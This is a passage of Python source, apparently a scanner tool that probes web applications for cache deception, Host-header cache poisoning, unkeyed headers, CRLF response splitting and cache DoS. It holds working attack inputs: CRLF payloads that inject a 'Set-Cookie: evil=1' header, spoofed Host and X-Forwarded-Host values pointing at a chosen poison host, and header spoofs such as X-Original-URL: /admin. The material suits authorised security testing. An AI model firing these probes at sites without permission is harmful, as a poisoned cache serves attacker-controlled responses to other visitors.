            return await self._full_scan(target_url, cookies, poison_host, cache_buster)
        elif action == "path_confusion":
            return await self._test_path_confusion(target_url, cookies, cache_buster, extension)
        elif action == "host_header_poison":
            return await self._test_host_poison(target_url, cookies, poison_host, cache_buster)
        elif action == "unkeyed_headers":
            return await self._test_unkeyed_headers(target_url, cookies, cache_buster, extra_headers or {})
        elif action == "response_split":
            return await self._test_response_split(target_url, cookies, cache_buster)
        elif action == "dos_cache":
            return await self._test_dos_cache(target_url, cache_buster)
        else:
            raise ToolExecutionError(f"Unknown action: {action!r}")

    async def _full_scan(
        self, target_url: str, cookies: str, poison_host: str, cache_buster: bool
    ) -> str:
        """Run all cache deception tests."""
        results: Dict[str, Any] = {
            "target_url": target_url,
            "tests": {},
            "vulnerabilities": [],
        }

        tests = [
            ("path_confusion", self._test_path_confusion(target_url, cookies, cache_buster, ".css")),
            ("host_header_poison", self._test_host_poison(target_url, cookies, poison_host, cache_buster)),
            ("unkeyed_headers", self._test_unkeyed_headers(target_url, cookies, cache_buster, {})),
        ]

        for test_name, coro in tests:
            try:
                test_result = json.loads(await coro)
                results["tests"][test_name] = test_result
                if test_result.get("vulnerable"):
                    results["vulnerabilities"].append(
                        {
                            "test": test_name,
                            "severity": test_result.get("severity", "MEDIUM"),
                            "description": test_result.get("description", ""),
                        }
                    )
            except Exception as exc:
                results["tests"][test_name] = {"error": str(exc)}

        results["vulnerability_count"] = len(results["vulnerabilities"])
        return truncate_output(json.dumps(results, indent=2))

    async def _test_path_confusion(
        self, target_url: str, cookies: str, cache_buster: bool, extension: str
    ) -> str:
        """
        Test web cache deception via path confusion.
        Appends static file extension to dynamic endpoints: /profile/account.css
        """
        buster = f"?cb={os.urandom(4).hex()}" if cache_buster else ""

        # Test 1: Append static extension
        confused_urls = [
            f"{target_url.rstrip('/')}/nonexistent{extension}{buster}",
            f"{target_url.rstrip('/')}.{extension.lstrip('.')}{buster}",
            f"{target_url.rstrip('/')}/..;/api{buster}",
            f"{target_url.rstrip('/')}/{extension.lstrip('.')}{buster}",
        ]

        headers: Dict[str, str] = {}
        if cookies:
            headers["Cookie"] = cookies

        results = []
        for url in confused_urls[:2]:  # Limit requests
            status1, headers1, body1 = await _http_probe(url, headers=headers)
            # Check if response contains cache headers indicating it was cached
            cache_control = headers1.get("Cache-Control", "")
            x_cache = headers1.get("X-Cache", "")
            cf_cache = headers1.get("CF-Cache-Status", "")

            results.append(
                {
                    "tested_url": url,
                    "status": status1,
                    "cache_control": cache_control,
                    "x_cache": x_cache,
                    "cf_cache_status": cf_cache,
                    "potentially_cached": (
                        "public" in cache_control or
                        "HIT" in x_cache or
                        "HIT" in cf_cache
                    ),
                    "response_snippet": body1[:200],
                }
            )

        vulnerable = any(r["potentially_cached"] for r in results)

        return json.dumps(
            {
                "test": "path_confusion",
                "target_url": target_url,
                "vulnerable": vulnerable,
                "severity": "HIGH" if vulnerable else "NONE",
                "description": (
                    "Cache deception: authenticated response cached due to static-extension confusion"
                    if vulnerable else "No path confusion caching detected"
                ),
                "results": results,
                "manual_steps": [
                    f"1. Browse (authenticated): {target_url.rstrip('/')}/account{extension}",
                    "2. Note X-Cache: HIT or CF-Cache-Status: HIT",
                    "3. Browse unauthenticated — if you see cached auth response, it's vulnerable",
                ],
            },
            indent=2,
        )

    async def _test_host_poison(
        self, target_url: str, cookies: str, poison_host: str, cache_buster: bool
    ) -> str:
        """Test Host header cache poisoning."""
        buster = f"?cb={os.urandom(4).hex()}" if cache_buster else ""
        test_url = f"{target_url.rstrip('/')}{buster}"

        headers: Dict[str, str] = {
            "Host": poison_host,
            "X-Forwarded-Host": poison_host,
            "X-Host": poison_host,
            "X-Forwarded-Server": poison_host,
        }
        if cookies:
            headers["Cookie"] = cookies

        status, resp_headers, body = await _http_probe(test_url, headers=headers)

        # Check if attacker host appears in response (e.g., in redirect, links)
        host_in_response = poison_host in body

        return json.dumps(
            {
                "test": "host_header_poison",
                "target_url": target_url,
                "poison_host": poison_host,
                "status_code": status,
                "host_reflected_in_response": host_in_response,
                "vulnerable": host_in_response,
                "severity": "HIGH" if host_in_response else "NONE",
                "description": (
                    f"Host header reflected in response — cache poisoning possible via {poison_host}"
                    if host_in_response else "Host header not reflected in response"
                ),
                "response_snippet": body[:300],
                "cache_headers": {
                    k: v for k, v in resp_headers.items()
                    if "cache" in k.lower() or "age" in k.lower()
                },
                "exploitation": (
                    "If this response is cached, all subsequent visitors will receive "
                    f"responses referencing {poison_host} (redirect hijacking, script injection)"
                    if host_in_response else "Not exploitable"
                ),
            },
            indent=2,
        )

    async def _test_unkeyed_headers(
        self, target_url: str, cookies: str, cache_buster: bool, extra_headers: Dict[str, str]
    ) -> str:
        """Test for unkeyed headers that influence response and get cached."""
        buster = f"?cb={os.urandom(4).hex()}" if cache_buster else ""

        # Headers commonly used in cache keying decisions
        test_header_sets = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Original-URL": "/admin"},
            {"X-Rewrite-URL": "/admin"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"Forwarded": "for=127.0.0.1;proto=https"},
        ]

        results = []
        base_status, base_headers, base_body = await _http_probe(
            f"{target_url}{buster}",
            headers={"Cookie": cookies} if cookies else {},
        )

        for test_headers in test_header_sets[:3]:  # Limit to 3 tests
            merged = {**test_headers, **({"Cookie": cookies} if cookies else {}), **extra_headers}
            status, resp_headers, body = await _http_probe(
                f"{target_url}{buster}", headers=merged
            )

            different_response = body != base_body and status != base_status
            results.append(
                {
                    "injected_headers": test_headers,
                    "status": status,
                    "response_differs": different_response,
                    "potentially_unkeyed": different_response,
                }
            )

        any_unkeyed = any(r["potentially_unkeyed"] for r in results)

        return json.dumps(
            {
                "test": "unkeyed_headers",
                "target_url": target_url,
                "vulnerable": any_unkeyed,
                "severity": "HIGH" if any_unkeyed else "NONE",
                "description": (
                    "Unkeyed header detected — cache may serve poisoned responses to other users"
                    if any_unkeyed else "No unkeyed header influence detected"
                ),
                "results": results,
                "base_status": base_status,
            },
            indent=2,
        )

    async def _test_response_split(self, target_url: str, cookies: str, cache_buster: bool) -> str:
        """Test for HTTP response splitting in cached responses."""
        buster = f"?cb={os.urandom(4).hex()}" if cache_buster else ""

        # Payloads that attempt CRLF injection
        crlf_payloads = [
            "value%0d%0aSet-Cookie:%20evil=1",
            "value%0aSet-Cookie:%20evil=1",
            "value\r\nSet-Cookie: evil=1",
        ]

        results = []
        for payload in crlf_payloads:
            test_url = f"{target_url}?param={payload}{buster}"
            status, resp_headers, body = await _http_probe(test_url)

            injected_header = "evil" in str(resp_headers)
            results.append(
                {
                    "payload": payload,
                    "status": status,
                    "header_injected": injected_header,
                    "response_snippet": body[:200],
                }
            )

        any_vuln = any(r["header_injected"] for r in results)

        return json.dumps(
            {
                "test": "response_split",
                "target_url": target_url,
                "vulnerable": any_vuln,
                "severity": "HIGH" if any_vuln else "NONE",
                "description": (
                    "HTTP response splitting detected — cache poisoning via CRLF injection possible"
                    if any_vuln else "No response splitting detected"
                ),
                "results": results,
            },
            indent=2,
        )

    async def _test_dos_cache(self, target_url: str, cache_buster: bool) -> str:
        """Test for cache-based DoS: large response caching, vary explosion."""
        buster = f"?cb={os.urandom(4).hex()}" if cache_buster else ""

        # Check Vary header — Vary: * means all headers vary the cache key (DoS via explosion)
        status, resp_headers, body = await _http_probe(f"{target_url}{buster}")

        vary = resp_headers.get("Vary", "")
        cache_control = resp_headers.get("Cache-Control", "")

        issues: List[str] = []

        if "Vary: *" in vary or vary == "*":
            issues.append("Vary: * means no response can be served from cache (effective DoS on cache layer)")

        if "no-store" not in cache_control and "private" not in cache_control:
            if not vary:
                issues.append(
                    "No Vary header — all requests with same URL may receive same cached response "
                    "(user-specific data leak risk)"
                )

        return json.dumps(
            {
                "test": "dos_cache",
                "target_url": target_url,
                "status_code": status,
                "vary": vary,
                "cache_control": cache_control,
                "issues": issues,
                "vulnerable": bool(issues),
                "severity": "MEDIUM" if issues else "NONE",
            },
            indent=2,
        )
